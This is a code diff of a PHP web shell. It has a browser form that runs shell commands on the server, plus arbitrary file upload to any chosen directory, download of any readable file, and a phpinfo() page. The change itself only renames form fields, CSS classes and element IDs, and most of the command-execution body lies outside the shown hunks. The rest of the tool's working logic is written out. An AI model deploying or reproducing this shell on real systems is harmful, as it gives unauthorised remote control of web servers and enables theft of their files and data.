@@ -15,13 +15,13 @@
         exit();
     }
 
-    if(isset($_POST["submit-phpinfo"])) {
+    if(isset($_POST["phpinfo"])) {
         phpinfo();
         exit();
     }
 
-    if(isset($_POST["download-file"]) && trim($_POST["download-file"]) !== "") {
-        $file = $_POST["download-file"];
+    if(isset($_POST["downloadFile"]) && trim($_POST["downloadFile"]) !== "") {
+        $file = $_POST["downloadFile"];
         if(is_readable($file)) {
             header('Content-Type: ' . mime_content_type($file));
             header('Content-Disposition: attachment; filename="' . basename($file) . '"');
@@ -33,26 +33,26 @@
         }
     }
 
-    if(isset($_POST["submit-upload"])) {
-        if(isset($_POST["upload-dir"]) && trim($_POST["upload-dir"]) !== "") {
-            $upload_dir = $_POST["upload-dir"];
+    if(isset($_POST["uploadSubmit"])) {
+        if(isset($_POST["uploadDir"]) && trim($_POST["uploadDir"]) !== "") {
+            $upload_dir = $_POST["uploadDir"];
         } else {
             $upload_dir = ".";
         }
         $upload_msg = "";
-        foreach($_FILES["upload-files"]["error"] as $key => $error) {
+        foreach($_FILES["uploadFiles"]["error"] as $key => $error) {
             if($error == UPLOAD_ERR_OK) {
-                $filename = basename($_FILES["upload-files"]["name"][$key]);
+                $filename = basename($_FILES["uploadFiles"]["name"][$key]);
                 $dest = $upload_dir . DIRECTORY_SEPARATOR . $filename;
-                if(move_uploaded_file($_FILES["upload-files"]["tmp_name"][$key], $dest)) {
+                if(move_uploaded_file($_FILES["uploadFiles"]["tmp_name"][$key], $dest)) {
                     $upload_msg .= "Successfully uploaded <code>" . htmlspecialchars($filename) . "</code> to <code>" . htmlspecialchars($dest) . "</code><br />\n";
                 } else {
                     $upload_msg .= "Error saving <code>" . htmlspecialchars($filename) . "</code> to <code>" . htmlspecialchars($dest) . "</code><br />\n";
                 }
             } else if($error == UPLOAD_ERR_INI_SIZE) {
-                $upload_msg .= "Error uploading <code>" . htmlspecialchars(basename($_FILES["upload-files"]["name"][$key])) . "</code>: File too large, maximum is <code>" . htmlspecialchars(ini_get("upload_max_filesize")) ."</code><br />\n";
+                $upload_msg .= "Error uploading <code>" . htmlspecialchars(basename($_FILES["uploadFiles"]["name"][$key])) . "</code>: File too large, maximum is <code>" . htmlspecialchars(ini_get("upload_max_filesize")) ."</code><br />\n";
             } else {
-                $upload_msg .= "Error uploading <code>" . htmlspecialchars(basename($_FILES["upload-files"]["name"][$key])) . "</code>, error code: <code>" . htmlspecialchars($error) . "</code><br />\n";
+                $upload_msg .= "Error uploading <code>" . htmlspecialchars(basename($_FILES["uploadFiles"]["name"][$key])) . "</code>, error code: <code>" . htmlspecialchars($error) . "</code><br />\n";
             }
         }
     }
@@ -71,23 +71,23 @@
             input[type=text] {
                 font-family: monospace;
             }
-            .cmd-box {
+            .cmdBox {
                 width: 80%;
             }
-            .info-line {
+            .infoText {
                 margin: 3px auto;
             }
-            .feature-box {
+            .featureBox {
                 margin: 1rem auto;
             }
         </style>
     </head>
     <body>
-        <form id="form-cmd" method="POST" action="">
-            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmd-box" />
-            <input type="submit" name="submit-cmd" value="Run" />
+        <form id="cmdForm" method="POST" action="">
+            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmdBox" />
+            <input type="submit" name="cmdSubmit" value="Run" />
         </form>
-        <div class="info-line">
+        <div class="infoText">
 <?php
     if($execute) {
         echo "Output of command: <code>" . htmlspecialchars($_POST["cmd"]) . "</code>\n";
@@ -96,7 +96,7 @@
     }
 ?>
         </div>
-        <textarea readonly="readonly" rows="25" class="cmd-box">
+        <textarea readonly="readonly" rows="25" class="cmdBox">
 <?php
     if($execute) {
         if(function_exists("proc_open")) {
@@ -136,7 +136,7 @@
     }
 ?>
         </textarea>
-        <div class="info-line">
+        <div class="infoText">
 <?php
     if(isset($exec_func)) {
         echo "Execution function: <code>" . $exec_func . "</code>";
@@ -146,7 +146,7 @@
     }
 ?>
         </div>
-        <div class="feature-box">
+        <div class="featureBox">
             <b>File Upload</b>
             <div>
 <?php
@@ -156,12 +156,12 @@
 ?>
             </div>
             <form method="POST" action="" enctype="multipart/form-data">
-                <input type="text" name="upload-dir" placeholder="Destination folder" />
-                <input type="file" name="upload-files[]" multiple="multiple" />
-                <input type="submit" name="submit-upload" value="Upload" />
+                <input type="text" name="uploadDir" placeholder="Destination folder" />
+                <input type="file" name="uploadFiles[]" multiple="multiple" />
+                <input type="submit" name="uploadSubmit" value="Upload" />
             </form>
         </div>
-        <div class="feature-box">
+        <div class="featureBox">
             <b>File Download</b>
             <div>
 <?php
@@ -171,14 +171,14 @@
 ?>
             </div>
             <form method="POST" action="">
-                <input type="text" name="download-file" placeholder="File to download" />
-                <input type="submit" name="submit-download" value="Download" />
+                <input type="text" name="downloadFile" placeholder="File to download" />
+                <input type="submit" name="downloadSubmit" value="Download" />
             </form>
         </div>
-        <div class="feature-box">
+        <div class="featureBox">
             <b>Info</b>
             <form method="POST" action="" target="_blank">
-                <input type="submit" name="submit-phpinfo" value="phpinfo()" />
+                <input type="submit" name="phpinfo" value="phpinfo()" />
             </form>
         </div>
         <script>
@@ -212,7 +212,7 @@
                 shellHistory = new Array();
             }
             var historyPos = shellHistory.length;
-            document.getElementById("form-cmd").addEventListener("submit", saveHistory);
+            document.getElementById("cmdForm").addEventListener("submit", saveHistory);
             document.getElementById("cmd").addEventListener("keydown", cycleHistory);
         </script>
     </body>
